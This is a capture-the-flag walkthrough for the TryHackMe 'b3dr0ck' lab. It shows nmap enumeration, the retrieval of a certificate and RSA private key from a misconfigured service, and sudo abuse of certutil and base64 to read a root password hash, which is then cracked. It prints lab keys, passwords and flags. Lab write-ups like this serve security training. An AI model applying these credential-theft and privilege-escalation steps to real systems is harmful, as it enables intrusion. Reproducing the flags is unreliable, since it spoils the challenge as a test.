# [Challenge](https://tryhackme.com/room/b3dr0ck

# ENUM
## nmap (`nmap -A -p- -T4 --min-rate 5000 bedrock`)
```nmap
PORT      STATE SERVICE      VERSION
22/tcp    open  ssh          OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1d:e2:ea:be:41:c7:91:06:4a:ba:70:2b:26:6f:c8:6f (RSA)
|   256 c6:3d:33:07:97:d6:e8:cb:5f:51:e6:a8:5f:e2:cc:33 (ECDSA)
|_  256 15:34:6c:45:14:87:40:a7:41:b2:80:22:85:ab:10:cc (ED25519)
80/tcp    open  http         nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://bedrock:4040/
4040/tcp  open  ssl/yo-main?
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2025-08-30T15:50:15
|_Not valid after:  2026-08-30T15:50:15
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Sat, 30 Aug 2025 15:51:16 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|_    Need to try and secure
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
9009/tcp  open  pichat?
| fingerprint-strings: 
|   NULL: 
|     ____ _____ 
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?
54321/tcp open  ssl/unknown
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2025-08-30T15:50:15
|_Not valid after:  2026-08-30T15:50:15
|_ssl-date: TLS randomness does not represent time
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4040-TCP:V=7.97%T=SSL%I=7%D=8/30%Time=68B31DF4%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nDate:\x20Sat,\x2030\x20Aug\x202025\x2015:51:16\x20GMT\r\nConnectio
SF:n:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<head>\n\x20\x20
SF:\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x
SF:20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2035em;\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x20sans-serif;
SF:\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x20\x20</head>\
SF:n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20ABC!</h1>\n\x20
SF:\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n\n\x20\x20\x2
SF:0\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x20a\x20website
SF:!\x20Can\x20you\x20believe\x20this\x20technology\x20exists\x20in\x20bed
SF:rock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helping\x20to\x20se
SF:tup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info\x20was\x20im
SF:portant\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\x20only\x20fi
SF:gured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll\x20is\x20a\x
SF:20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a\x20sql\x20da
SF:tabase,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLooks\x20like\x
SF:20it\x20started\x20something\x20else,\x20but\x20I'm\x20not\x20sure\x20h
SF:ow\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x20was\x20from\
SF:x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20try\x20and\x2
SF:0secure\x20")%r(HTTPOptions,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type
SF::\x20text/html\r\nDate:\x20Sat,\x2030\x20Aug\x202025\x2015:51:16\x20GMT
SF:\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<he
SF:ad>\n\x20\x20\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\
SF:x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2
SF:035em;\n\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x
SF:20sans-serif;\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x2
SF:0\x20</head>\n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20AB
SF:C!</h1>\n\x20\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n
SF:\n\x20\x20\x20\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x2
SF:0a\x20website!\x20Can\x20you\x20believe\x20this\x20technology\x20exists
SF:\x20in\x20bedrock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helpin
SF:g\x20to\x20setup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info
SF:\x20was\x20important\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\
SF:x20only\x20figured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll
SF:\x20is\x20a\x20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a
SF:\x20sql\x20database,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLo
SF:oks\x20like\x20it\x20started\x20something\x20else,\x20but\x20I'm\x20not
SF:\x20sure\x20how\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x2
SF:0was\x20from\x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20
SF:try\x20and\x20secure\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9009-TCP:V=7.97%I=7%D=8/30%Time=68B31DE3%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29E,"\n\n\x20__\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20__\x20\x20_\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20____\x20\x20\x20_____\x20\
SF:n\x20\\\x20\\\x20\x20\x20\x20\x20\x20\x20\x20/\x20/\x20\|\x20\|\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20/\\\x20\x20\x20\|\x20\x20_\x20\\\x20/\x20____\|\n\x20\x20\\\x
SF:20\\\x20\x20/\\\x20\x20/\x20/__\|\x20\|\x20___\x20___\x20\x20_\x20__\x2
SF:0___\x20\x20\x20___\x20\x20\|\x20\|_\x20___\x20\x20\x20\x20\x20\x20/\x2
SF:0\x20\\\x20\x20\|\x20\|_\)\x20\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20\x2
SF:0\\\x20\\/\x20\x20\\/\x20/\x20_\x20\\\x20\|/\x20__/\x20_\x20\\\|\x20'_\
SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\|\x20__/\x20_\x20\\\x20\x20\x20\x20
SF:/\x20/\\\x20\\\x20\|\x20\x20_\x20<\|\x20\|\x20\x20\x20\x20\x20\n\x20\x2
SF:0\x20\x20\\\x20\x20/\\\x20\x20/\x20\x20__/\x20\|\x20\(_\|\x20\(_\)\x20\
SF:|\x20\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\|\x20\|\|\x20\(_\)\x20\|
SF:\x20\x20/\x20____\x20\\\|\x20\|_\)\x20\|\x20\|____\x20\n\x20\x20\x20\x2
SF:0\x20\\/\x20\x20\\/\x20\\___\|_\|\\___\\___/\|_\|\x20\|_\|\x20\|_\|\\__
SF:_\|\x20\x20\\__\\___/\x20\x20/_/\x20\x20\x20\x20\\_\\____/\x20\\_____\|
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
SF:n\nWhat\x20are\x20you\x20looking\x20for\?\x20");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
# EXPLOITATION
I tried to connect to pichat: `telnet bedrock 9009`
```
__          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
     
What are you looking for? certificate
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNTA4MzAxNjU3MzhaFw0yNjA4MzAxNjU3MzhaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDEXsAk
uRm+mtNaTaNzgMHX46A1Qcubf/fq09itT/Mu+jsCSlMvhVHfNEdJiALYa0Q2bJFJ
rUNxbaYqI1EcBwZW1Px29ZhOANoRaLmmiA+YqnptZVPS65nhTa+xvJR/DdPyXtgg
a5v1gOTRtQN9DyZPYOAJEy542NlNwDg5UM64+1VpdowOcK9GqkO7lDCTG3Rtu7Hf
oHRNl8mqmSe3pdrmlqnINfq/dz+yY5ynK5pm+sqqX41C7gAcYu284Be1PBz6aBJ8
OYsakL1Kpfrt60HGHSjJnyD6rMpEUTzNO/Gz4c7rDGt4n7qxDjR1jcX/H9wl6CP6
3OnrwtYKo5UaS2PjAgMBAAEwDQYJKoZIhvcNAQELBQADggEBACX0X3DVB5ruBos3
7015hcvibSU0Ov18Pf1Eps/SVH3oLBVGUl0+YTCt0Y7WaP2trvKqosxWktfK+D6o
b8X44oTmcYZDMgn9W0UUnY4+8IbTDfNx+VBssy6j8fYuboecxfS+Y/tXopaZOTMm
sdy/aR35EzXJKjdZymykMaButsu0RAbTs35AruPwlZ8Lcl6HXC2pqrdiy1pqfY25
0HU6ldlqQWavyyCM+YVD4x5Ym2Xh83GX8a0lT0lB1zL8irxuFFKTP9VPgOxu48Ce
dQS7T2GTSiVuJGMpxUrzbINTgop5j6XrmlvOrereYn3X0y3y2LrqJTOf6L5gNpAf
Io1T1k0=
-----END CERTIFICATE-----

You use this service to recover your client certificate and private key
What are you looking for? key  
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAxF7AJLkZvprTWk2jc4DB1+OgNUHLm3/36tPYrU/zLvo7AkpT
L4VR3zRHSYgC2GtENmyRSa1DcW2mKiNRHAcGVtT8dvWYTgDaEWi5pogPmKp6bWVT
0uuZ4U2vsbyUfw3T8l7YIGub9YDk0bUDfQ8mT2DgCRMueNjZTcA4OVDOuPtVaXaM
DnCvRqpDu5Qwkxt0bbux36B0TZfJqpknt6Xa5papyDX6v3c/smOcpyuaZvrKql+N
Qu4AHGLtvOAXtTwc+mgSfDmLGpC9SqX67etBxh0oyZ8g+qzKRFE8zTvxs+HO6wxr
eJ+6sQ40dY3F/x/cJegj+tzp68LWCqOVGktj4wIDAQABAoIBAQCaIw2LRcfRd1ID
BgIQvbZqMYAljZm2W0JMjzD7CVCHRV9gMtsM6AcVvsFeFGa3XatTVPDN9jSEKl9N
oB8gctsk+VWaQrjkMYL6O0vOTeqAGQC0Md8UJl7JHOOWDcI54K7HBm97Mzxd/mid
uwob9fJKSG5ScT3/GaeoggMf6i/5vd3FX3coA/n0s0RTMpRmXXGrRZVAC0qZ7pPh
phl/eiOzR236YA4ej2bQCk2gKIQVhDoKmZTIBz/Po2f43kwpxbHVeT5PIuNFTnQo
wqxvM5Gtv9MURFWIRZ8cQksPzOzl+sLP9vPHKqqldob9l1aTsUWwj20HBObRvacp
W/GLnXhBAoGBAPAHNuO6EajbC9KzlDvUhWj70Iy2N1AqJ74UT6eoXat0O3XzkJh3
caYR98FzN/cWXtZLxknx1WaGmx1UAlVDxruFms4ceNyQfQU2qYyuy1nqr0oWFSmP
DRU2e5g6vyaCwPiU4OOYqi9K/fgAjZM4XqXuu6Di4TakFfMxmnwLCuURAoGBANFv
1pdsDbgyXQkZpFTEEir47yI6PQvd9c3RYL6gR0ihbZlmy4qEoLhVlFi3pgYJwKc/
+a4p6UEomblRQamFSReMu7smlj2IU6Ewr61ttuM+C6j0dH0vZIzI8/4oh0LAlPlv
48BWXgWKbPm95QQXhhMK6FOQ7APn2xpo/VbFJamzAoGAdGxLZ3HdFvYIag7Im6yd
eSqLIXVQpwWLeVsIt92mcX9TSAb337wv18lnTuHAB41GOtNOPpeaVrx7iGIzL4BM
aLCJQef1h6ZdvaWh36b444g9tcW4Rgwo4F0o3dHA3cEWMHymCD8IbSAGx8Ac64ew
APQm9gaWDpbQPsGUmQ4SHsECgYEAorgHu+HhzuiiS/22JX2ot+ZstOUWpO+wmFZC
mhihCZcSNgsdvONKk6058qvMvAg7vDYCYQSDC3Ll7ItrPrAll7xp5wAV3nzarPPM
qiwB2hBMstoq31BBCPjgSOloHb7Of/YktzzjE972yBp3onQ8YPMqijKgjHBJVP2Z
Rx8pIe0CgYBeFOerZLkJ9vVAPq3JduaLqqB0T37aknbe6muBKxGSy+1mKSv7g336
CP8SD+HCJRXOHBbx1i4xRdGGSDMz3yMs6P8TaegDziwOcpIL6IZjBPdVBPN/a854
UOsFkIoZbosUqteueluqOZk0P3ieeQqCAr4zdvmWzoKxRt9kKZkkTQ==
-----END RSA PRIVATE KEY-----
```
Let's also connect with port 54321: `openssl s_client -connect bedrock:54321 -cert certificate -key id_rsa`
```
b3dr0ck> password
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
```
Let's connect to SSH with these!
`barney.txt`: `THM{f05780f08f0eb1de65023069d0e4c90c}`
# PRIVILEGE ESCALATION
`sudo -l`: `(ALL : ALL) /usr/bin/certutil` -> `sudo certutil ls`
```bash
Current Cert List: (/usr/share/abc/certs)
------------------
total 72
drwxrwxr-x 2 root root 4096 Aug 30 16:28 .
drwxrwxr-x 8 root root 4096 Apr 29  2022 ..
-rw-r--r-- 1 root root  968 Aug 30 16:28 a.certificate.pem
-rw-r--r-- 1 root root 1674 Aug 30 16:28 a.clientKey.pem
-rw-r--r-- 1 root root  890 Aug 30 16:28 a.csr.pem
-rw-r--r-- 1 root root 1678 Aug 30 16:28 a.serviceKey.pem
-rw-r----- 1 root root  972 Aug 30 15:50 barney.certificate.pem
-rw-r----- 1 root root 1674 Aug 30 15:50 barney.clientKey.pem
-rw-r----- 1 root root  894 Aug 30 15:50 barney.csr.pem
-rw-r----- 1 root root 1678 Aug 30 15:50 barney.serviceKey.pem
-rw-r----- 1 root root  976 Aug 30 15:50 fred.certificate.pem
-rw-r----- 1 root root 1678 Aug 30 15:50 fred.clientKey.pem
-rw-r----- 1 root root  898 Aug 30 15:50 fred.csr.pem
-rw-r----- 1 root root 1678 Aug 30 15:50 fred.serviceKey.pem
```
Let's check Fred's `id_rsa` and certificate: `sudo certutil -a fred.csr.pem` and let's save them:
```
-----BEGIN CERTIFICATE-----
MIICnjCCAYYCAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNTA4MzAxNzAyMjBaFw0yNTA4MzExNzAyMjBaMBUxEzARBgNVBAMMCmZy
ZWRjc3JwZW0wggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQCheBsmK77x
RtmL2nnD12TY06UuS9BcIH/45pQfx2qwLxgyoN7XCxvxhNEdCkugmd5RcHm75TAr
F61+K/0WeMOHD2+o1qJMdVnL3e6s21fzno+Zffznn9RHq0J96Cr2fSoNsUipipYP
IhNeq2AV0efECXqFE8es/zZb2DbB4J406ctnvt338N0renSVIrNBdCdFkdZiGBu6
LAPcEwN+zjn8lr/0ayrTRA8NWDLtX/CQuC5Ugd424Lh/6hRRZl6l8XVH+GK28i5X
yXVWe9x9ueEE0MF8PAn8fIU7thkyTqTTd4JOGgUCoQgl2hM/pRwdcI5OHGaJBP79
ueMurxVbrb7RAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAEHndbRqndbVICFgLaLY
bsLX8Qa6WV9mQSt5CXpxLxlBkPXJriKtF7Lcz9tBKprNYtF3URv7ba1fzCVxw1M8
BOQdSfO3gEh5hrxbkZ1FiKAeMkB5UTArPje950Aoq42OWGzLok7CEPv2tnWfJY2g
+gQvclK+4srt6d9bCGcrgzgWJ8TpPNT0NHIY2vuaFw4OZTDZ9w38yZYmfAswGQsu
tOFwI3GfvvwkiWlk+Ef39Kh0Mku44oNS2FW0ZKSUxkVa1QrvBA79QCuduo8pwSCr
DHeH6VeVhBAX4w137AzP/J8tHXwik5keBQfrAk/4ibOfIdRqxvKeEck1Yz66X7IY
sjs=
-----END CERTIFICATE-----
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAoXgbJiu+8UbZi9p5w9dk2NOlLkvQXCB/+OaUH8dqsC8YMqDe
1wsb8YTRHQpLoJneUXB5u+UwKxetfiv9FnjDhw9vqNaiTHVZy93urNtX856PmX38
55/UR6tCfegq9n0qDbFIqYqWDyITXqtgFdHnxAl6hRPHrP82W9g2weCeNOnLZ77d
9/DdK3p0lSKzQXQnRZHWYhgbuiwD3BMDfs45/Ja/9Gsq00QPDVgy7V/wkLguVIHe
NuC4f+oUUWZepfF1R/hitvIuV8l1VnvcfbnhBNDBfDwJ/HyFO7YZMk6k03eCThoF
AqEIJdoTP6UcHXCOThxmiQT+/bnjLq8VW62+0QIDAQABAoIBAEJpTulNNtSv6kwu
SMS288CGlDrNbd5mc5wg4i2L7KKYTCCOr/jMleqpUQTbti1Q+/KNC1SvuDcRHwd0
+jxi4TDMtYVA+jHuVkeWeVNZR/xoa/GaswllYH81vjxg4ELPShulnhg1avDAeC0I
2ZU/505nA6B2eTr7IRV3gVYOl6N1GhkvUg/KAqqe4MbEJLn3o9nhQeYsPIgtMUOV
7ENfRTupwDvIRKh4YMHv2wiUdD9mQbPIAK3DKS70sPQaFhU1BfhwgLvaFeI1ptI8
2/xBx5tCAqqNInmZbtQ3rL7XTOVfW7rMHqgwB2QZ6TVh8kl8iabttgJmhrXpdBxY
5v0GJE0CgYEA0zPixffkRQWQVV8PORFRRje1ndim8eI+RoEhBsKDkSdQezuG4CU1
nFkINykJhTSzkqyg43pTENqFqRtJcdw672w7bv1mULMzKQdc9cGiQWBVJSN6mbE/
Y/8SlsqMLoozxUgbC2l120wEibB5kLg2gGOBtYtgLxA5lYDNQV/aTfcCgYEAw7e8
RBN/vrESzfvvLvMEf7rym6zbMbjpvyIj2+tkqrlEXrYYRC0+e7lK7mGPmEYLwi+e
AAKAp1ADO9JfMgexANWqMXajt08YwyjSMuvKPaYeuk4tcRqMBRmDS3ypqsV8rHy0
TYXrq7IdDwM+p/9IyIsr/caGnBZWiyXQZbYMR3cCgYEAsU9iFymiLoAZSFLiCNsN
DJJAmyAEKBX0imRmQbKTmg0TeCHlfdA/Td9BEm4VXAt+pqje+Zr8ma2bgPkzk698
mvyWePusJhwL22ofFQNXIOOrF97NUrKHsX+3L3kkbv3/sKR0cAQ9ubn8JUxPArxk
pSzk/HDicyB/94+GwleigskCgYEAmbkvuzyhgpKsVXPDCto/t1+L/LBJPgWiOsjC
55I88EcyJz3ZU3tB74W7D/86/PxPcgdaj2Fn0YJr98mlkbMu2Jv54H3x2yHaLjda
2joPEFrxGZ4b3RFf1wWR9XGGBia1ZPlR2O4ODD6KymbfCK7faPy+4cXTprd45DQg
OjNB88MCgYBaXQdhxOIEp/P3hE155iTmW7yrMNaecywa2zdvBtFo3NLHteVUVFLQ
wc5/8olzuMrORbjTU7DA1tA1VrN4rFgu1VuV5bNlAL/a2xZk+w5hVfhmpuGci5Zo
zHCCnO1qjmuU0Hw5k2MqDimceRn6rMGIwaX/tDirjezTxQKdMgHpWw==
-----END RSA PRIVATE KEY-----
```
```
b3dr0ck> password
Password hint: YabbaDabbaD0000! (user = 'fredcsrpem')
```
Perfect! Let's login again into SSH.

`sudo -l`: 
```bash
(ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
(ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
```
Interesting! Let's use that: `sudo /usr/bin/base64 /root/pass.txt`: `TEZLRUM1MlpLUkNYU1dLWElaVlU0M0tKR05NWFVSSlNMRldWUzUyT1BKQVhVVExOSkpWVTJSQ1dOQkdYVVJUTEpaS0ZTU1lLCg==` -- (base64) -- (base32) --> `a00a12aad6b7c16bf07032bd05a31d56` 
I think it's MD5 raw, let's crack it with [crackstation.net](https://crackstation.net/): `flintstonesvitamins`
Let's `su root` and... we're ROOT!
`root.txt`: `THM{de4043c009214b56279982bf10a661b7}`